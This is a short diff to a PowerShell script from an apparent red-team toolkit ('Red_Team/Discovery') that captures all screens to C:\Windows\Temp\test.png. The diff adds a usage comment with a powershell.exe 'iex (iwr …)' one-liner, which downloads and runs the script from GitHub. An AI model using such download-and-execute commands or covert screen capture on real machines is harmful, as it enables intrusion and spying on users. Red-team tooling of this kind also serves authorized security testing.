@@ -1,5 +1,6 @@
 # Usage:
 # iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);
+# powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);"
 # Default path: C:\Windows\Temp\test.png
 $screens = [Windows.Forms.Screen]::AllScreens
 $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
